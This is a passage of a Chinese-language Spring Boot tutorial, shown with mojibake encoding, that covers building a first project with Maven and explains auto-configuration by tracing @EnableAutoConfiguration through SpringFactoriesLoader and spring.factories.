ç¬¬ä¸€ä¸ª SpringBoot ç¨‹åº</h2><p><font style="color:rgba(0, 0, 0, 0.9);">å®˜ç½‘æä¾›çš„åˆ›å»ºç½‘ç«™ï¼š</font><a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303579.png"></p><p>ä¸‹è½½è§£å‹ä¹‹åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303700.png"></p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œidea åˆ›å»ºæ–°é¡¹ç›®å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303753.png"></p><p>åˆ›å»ºä¸€ä¸ªæ¥å£æµ‹è¯•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303238.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303134.png"></p><p>maven æ‰“åŒ…ï¼š</p><p><strong>æ³¨æ„ï¼šé…ç½®æ–‡ä»¶ä¸­çš„</strong><font style="color:#080808;background-color:#ffffff;"> </font><code>&lt;skip&gt;true&lt;/skip&gt; </code><font style="color:#080808;background-color:#ffffff;">ï¼Œæ˜¯è®© </font><strong>spring-boot-maven-plugin è·³è¿‡æ‰§è¡Œ</strong><font style="color:#080808;background-color:#ffffff;"> çš„ï¼Œæ‰€ä»¥ Maven æ‰“åŒ…æ—¶ä¸ä¼šç”Ÿæˆå¯è¿è¡Œ JARï¼Œè‡ªç„¶å°±æ²¡æœ‰</font><code>Main-Class</code><font style="color:#080808;background-color:#ffffff;">ï¼Œè¿è¡Œæ—¶å°±æŠ¥ </font><strong>â€œæ²¡æœ‰ä¸»æ¸…å•å±æ€§â€</strong><font style="color:#080808;background-color:#ffffff;">ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303263.png"></p><p>ä¿®æ”¹ä¹‹åå¯ä»¥æ­£å¸¸è¿è¡Œï¼š</p><p><code> java -jar helloworld-0.0.1-SNAPSHOT.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303329.png"></p><h1 id="2ã€åŸç†"><a href="#2ã€åŸç†" class="headerlink" title="2ã€åŸç†"></a>2ã€åŸç†</h1><h2 id="2-1-è‡ªåŠ¨é…ç½®"><a href="#2-1-è‡ªåŠ¨é…ç½®" class="headerlink" title="2.1 è‡ªåŠ¨é…ç½®"></a>2.1 è‡ªåŠ¨é…ç½®</h2><h3 id="2-1-1-pom-xml"><a href="#2-1-1-pom-xml" class="headerlink" title="2.1.1 pom.xml"></a>2.1.1 pom.xml</h3><h4 id="çˆ¶ä¾èµ–"><a href="#çˆ¶ä¾èµ–" class="headerlink" title="çˆ¶ä¾èµ–"></a>çˆ¶ä¾èµ–</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- çˆ¶ä¾èµ– --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- ä»è¿œç¨‹ä»“åº“æŸ¥æ‰¾ --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç‚¹è¿›å»ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªçˆ¶ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰æ˜¯çœŸæ­£ç®¡ç†SpringBootåº”ç”¨é‡Œé¢æ‰€æœ‰ä¾èµ–ç‰ˆæœ¬çš„åœ°æ–¹ï¼ŒSpringBootçš„ç‰ˆæœ¬æ§åˆ¶ä¸­å¿ƒï¼›</p><p>ä»¥åæˆ‘ä»¬å¯¼å…¥ä¾èµ–é»˜è®¤æ˜¯ä¸éœ€è¦å†™ç‰ˆæœ¬ï¼›ä½†æ˜¯å¦‚æœå¯¼å…¥çš„åŒ…æ²¡æœ‰åœ¨ä¾èµ–ä¸­ç®¡ç†ç€å°±éœ€è¦æ‰‹åŠ¨é…ç½®ç‰ˆæœ¬äº†ï¼›</p><h4 id="å¯åŠ¨å™¨-spring-boot-starter"><a href="#å¯åŠ¨å™¨-spring-boot-starter" class="headerlink" title="å¯åŠ¨å™¨ spring-boot-starter"></a>å¯åŠ¨å™¨ spring-boot-starter</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-comment">&lt;!--å¯åŠ¨å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>springboot-boot-starter-xxxï¼šå°±æ˜¯spring-bootçš„åœºæ™¯å¯åŠ¨å™¨</p><p>spring-boot-starter-webï¼šå¸®æˆ‘ä»¬å¯¼å…¥äº†webæ¨¡å—æ­£å¸¸è¿è¡Œæ‰€ä¾èµ–çš„ç»„ä»¶ï¼›</p><p>SpringBootå°†æ‰€æœ‰çš„åŠŸèƒ½åœºæ™¯éƒ½æŠ½å–å‡ºæ¥ï¼Œåšæˆä¸€ä¸ªä¸ªçš„starter ï¼ˆå¯åŠ¨å™¨ï¼‰ï¼Œåªéœ€è¦åœ¨é¡¹ç›®ä¸­å¼•å…¥è¿™äº›starterå³å¯ï¼Œæ‰€æœ‰ç›¸å…³çš„ä¾èµ–éƒ½ä¼šå¯¼å…¥è¿›æ¥ ï¼Œ æˆ‘ä»¬è¦ç”¨ä»€ä¹ˆåŠŸèƒ½å°±å¯¼å…¥ä»€ä¹ˆæ ·çš„åœºæ™¯å¯åŠ¨å™¨å³å¯ ï¼›æˆ‘ä»¬æœªæ¥ä¹Ÿå¯ä»¥è‡ªå·±è‡ªå®šä¹‰ starterï¼›</p><h3 id="2-1-1-ä¸»å¯åŠ¨ç±»"><a href="#2-1-1-ä¸»å¯åŠ¨ç±»" class="headerlink" title="2.1.1 ä¸»å¯åŠ¨ç±»"></a>2.1.1 ä¸»å¯åŠ¨ç±»</h3><h4 id="é»˜è®¤çš„ä¸»å¯åŠ¨ç±»"><a href="#é»˜è®¤çš„ä¸»å¯åŠ¨ç±»" class="headerlink" title="é»˜è®¤çš„ä¸»å¯åŠ¨ç±»"></a>é»˜è®¤çš„ä¸»å¯åŠ¨ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-comment">//@SpringBootApplication æ¥æ ‡æ³¨ä¸€ä¸ªä¸»ç¨‹åºç±»</span><br><span class="hljs-comment">//è¯´æ˜è¿™æ˜¯ä¸€ä¸ªSpring Bootåº”ç”¨</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//å°† springboot åº”ç”¨å¯åŠ¨</span><br>        SpringApplication.run(Springboot01HelloworldApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ†ææ³¨è§£ï¼š"><a href="#åˆ†ææ³¨è§£ï¼š" class="headerlink" title="åˆ†ææ³¨è§£ï¼š"></a>åˆ†ææ³¨è§£ï¼š</h4><p>@SpringBootApplication</p><p><font style="color:rgba(0, 0, 0, 0.9);">ä½œç”¨ï¼šæ ‡æ³¨åœ¨æŸä¸ªç±»ä¸Šè¯´æ˜è¿™ä¸ªç±»æ˜¯SpringBootçš„ä¸»é…ç½®ç±» ï¼Œ SpringBootå°±åº”è¯¥è¿è¡Œè¿™ä¸ªç±»çš„mainæ–¹æ³•æ¥å¯åŠ¨SpringBootåº”ç”¨ï¼›</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303899.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å‰å››ä¸ªéƒ½å±äºå…ƒæ³¨è§£</span><br><span class="hljs-comment">//æŒ‡å®šè¿™ä¸ªæ³¨è§£å¯ä»¥æ ‡æ³¨çš„ Java å…ƒç´ ç±»å‹ï¼ŒElementType.TYPE è¡¨ç¤ºåªèƒ½æ ‡æ³¨åœ¨ç±»ã€æ¥å£ã€æšä¸¾æˆ–æ³¨è§£ç±»å‹ä¸Š</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-comment">//æŒ‡å®šæ³¨è§£ç”Ÿå‘½å‘¨æœŸï¼ŒRUNTIME è¡¨ç¤ºæ³¨è§£ä¼š ä¿ç•™åˆ°è¿è¡Œæ—¶ï¼Œå¯ä»¥é€šè¿‡ åå°„ è·å–</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-comment">//è¡¨ç¤ºæ³¨è§£ä¼šåŒ…å«åœ¨ Javadoc æ–‡æ¡£ä¸­</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-comment">//å¦‚æœä¸€ä¸ªç±»åŠ äº†è¿™ä¸ªæ³¨è§£ï¼Œå®ƒçš„å­ç±»ä¹Ÿä¼šè‡ªåŠ¨ç»§æ‰¿è¯¥æ³¨è§£</span><br><span class="hljs-meta">@Inherited</span><br><br><span class="hljs-comment">//springboot çš„é…ç½®ï¼Œæ ‡è®°å½“å‰ç±»æ˜¯ Spring Boot é…ç½®ç±»ï¼Œæœ¬è´¨ä¸Šæ˜¯ @Configuration çš„ä¸€ä¸ªç‰¹åŒ–</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-comment">//å¯ç”¨è‡ªåŠ¨é…ç½®</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><br><span class="hljs-comment">//å¯åŠ¨ç»„ä»¶æ‰«æï¼Œä¼šæ‰«æå½“å‰ç±»æ‰€åœ¨åŒ…åŠå­åŒ…çš„ Spring Bean,excludeFiltersï¼šæ’é™¤æŸäº›ç±»ä¸è¢«æ‰«æã€‚</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><br><span class="hljs-comment">//Spring æ³¨è§£</span><br><span class="hljs-comment">//è¡¨ç¤ºå½“å‰ç±»æ˜¯ä¸€ä¸ª Spring é…ç½®ç±»</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-comment">//Spring åœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆç´¢å¼•æ–‡ä»¶ï¼Œç”¨äºå¿«é€Ÿæ‰«ææ³¨è§£ç±»ï¼Œæé«˜å¯åŠ¨æ€§èƒ½</span><br><span class="hljs-meta">@Indexed</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//è‡ªåŠ¨é…ç½®åŒ…</span><br><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-comment">//ç»™å®¹å™¨å¯¼å…¥ç»„ä»¶</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.boot.enableautoconfiguration&quot;</span>;<br><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//Springåº•å±‚æ³¨è§£@import ï¼Œ ç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ä¸ªç»„ä»¶ï¼ŒRegistrar.class ä½œç”¨ï¼šå°†ä¸»å¯åŠ¨ç±»çš„æ‰€åœ¨åŒ…åŠåŒ…ä¸‹é¢æ‰€æœ‰å­åŒ…é‡Œé¢çš„æ‰€æœ‰ç»„ä»¶æ‰«æåˆ°Springå®¹å™¨ ï¼›</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationPackages.Registrar.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    String[] basePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› @Import({AutoConfigurationImportSelector.class})</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br>-&gt;AutoConfigurationImportSelector<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoConfigurationImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeferredImportSelector</span>, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered &#123;<br>    ...<br>    <span class="hljs-comment">//è·å–æ‰€æœ‰å€™é€‰çš„è‡ªåŠ¨é…ç½®ç±»;AnnotationMetadata metadataï¼šæ ‡æ³¨äº† @EnableAutoConfiguration æˆ– @SpringBootApplication çš„ç±»çš„æ³¨è§£ä¿¡æ¯;AnnotationAttributes attributesï¼šæ³¨è§£çš„å±æ€§é›†åˆï¼Œæ¯”å¦‚ excludeã€excludeName ç­‰</span><br>    <span class="hljs-keyword">protected</span> List&lt;String&gt; <span class="hljs-title function_">getCandidateConfigurations</span><span class="hljs-params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> &#123;<br>            <span class="hljs-comment">//é€šè¿‡ SpringFactoriesLoader ä» META-INF/spring.factories æ–‡ä»¶ä¸­åŠ è½½è‡ªåŠ¨é…ç½®ç±»å</span><br>        List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class="hljs-built_in">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class="hljs-built_in">this</span>.getBeanClassLoader());<br>            <span class="hljs-comment">//configurations ä¸ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼ŒæŠ›å‡ºå¼‚å¸¸æç¤º</span><br>        Assert.notEmpty(configurations, <span class="hljs-string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);<br>            <span class="hljs-comment">//è¿”å›å¯åŠ¨è‡ªåŠ¨å¯¼å…¥é…ç½®æ–‡ä»¶çš„æ³¨è§£ç±»ï¼›EnableAutoConfiguration</span><br>        <span class="hljs-keyword">return</span> configurations;<br>        &#125;<br>-&gt;SpringFactoriesLoader.loadFactoryNames<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringFactoriesLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryType, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoaderToUse</span> <span class="hljs-operator">=</span> classLoader;<br>        <span class="hljs-keyword">if</span> (classLoader == <span class="hljs-literal">null</span>) &#123;<br>            classLoaderToUse = SpringFactoriesLoader.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> factoryType.getName();<br>        <span class="hljs-comment">//è°ƒç”¨äº† loadSpringFactories æ–¹æ³•</span><br>        <span class="hljs-keyword">return</span> (List)loadSpringFactories(classLoaderToUse).getOrDefault(factoryTypeName, Collections.emptyList());<br>    &#125;<br>-&gt;loadSpringFactories<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class="hljs-title function_">loadSpringFactories</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-comment">//cache æ˜¯é™æ€ç¼“å­˜ï¼Œé¿å…æ¯æ¬¡éƒ½æ‰«ææ–‡ä»¶ã€‚å¦‚æœç¼“å­˜å­˜åœ¨ï¼Œç›´æ¥è¿”å›ï¼Œæå‡æ€§èƒ½</span><br>        Map&lt;String, List&lt;String&gt;&gt; result = (Map)cache.get(classLoader);<br>        <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//æ‰«æ META-INF/spring.factories</span><br>                Enumeration&lt;URL&gt; urls = classLoader.getResources(<span class="hljs-string">&quot;META-INF/spring.factories&quot;</span>);<br><br>                <span class="hljs-comment">//å°†æ¯ä¸ª spring.factories æ–‡ä»¶åŒ…è£…æˆ UrlResourceã€‚ä½¿ç”¨ PropertiesLoaderUtils åŠ è½½ä¸º Properties å¯¹è±¡ï¼Œkey=value çš„å½¢å¼</span><br>                <span class="hljs-keyword">while</span>(urls.hasMoreElements()) &#123;<br>                    <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> (URL)urls.nextElement();<br>                    <span class="hljs-type">UrlResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(url);<br>                    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> PropertiesLoaderUtils.loadProperties(resource);<br><br>                    <span class="hljs-comment">//éå†æ–‡ä»¶ä¸­çš„æ¯ä¸ªæ¡ç›®,æŠŠå®ç°ç±»åŠ å…¥åˆ—è¡¨</span><br>                    <span class="hljs-keyword">for</span>(Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> ((String)entry.getKey()).trim();<br>                        String[] factoryImplementationNames = StringUtils.commaDelimitedListToStringArray((String)entry.getValue());<br><br>                        <span class="hljs-keyword">for</span>(String factoryImplementationName : factoryImplementationNames) &#123;<br>                            ((List)result.computeIfAbsent(factoryTypeName, (key) -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>())).add(factoryImplementationName.trim());<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">//å»é‡ distinct(),è½¬ä¸º ä¸å¯ä¿®æ”¹åˆ—è¡¨ï¼ˆunmodifiableListï¼‰</span><br>                result.replaceAll((factoryType, implementations) -&gt; (List)implementations.stream().distinct().collect(Collectors.collectingAndThen(Collectors.toList(), Collections::unmodifiableList)));<br>                <span class="hljs-comment">//ç¼“å­˜ç»“æœå¹¶è¿”å›</span><br>                cache.put(classLoader, result);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>                <span class="hljs-comment">//è¯»å–æ–‡ä»¶å‡ºé”™æ—¶ï¼ŒæŠ›å‡º IllegalArgumentException å¼‚å¸¸</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unable to load factories from location [META-INF/spring.factories]&quot;</span>, ex);<br>            &#125;<br>        &#125;<br>    &#125;<br>-&gt;spring.factories ï¼ˆæ—¢ç„¶æ˜¯å¯¹æ­¤æ–‡ä»¶åšæ”¹åŠ¨ï¼Œé‚£ä¹ˆå…¨å±€æœç´¢æ­¤æ–‡ä»¶ï¼‰<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹åå‘ç°éƒ½æ˜¯è‡ªåŠ¨é…ç½®æ–‡ä»¶ï¼Œè¿™å°±æ˜¯è‡ªåŠ¨é…ç½®çš„æ ¹æº</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304861.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304988.png"></p><h5 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h5><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBootåœ¨å¯åŠ¨çš„æ—¶å€™ä»ç±»è·¯å¾„ä¸‹çš„ META-INF&#x2F;spring.factoriesï¼ˆspring-boot-autoconfigure-2.6.13.jar!\META-INF\spring.factoriesï¼‰ä¸­è·å– EnableAutoConfiguration 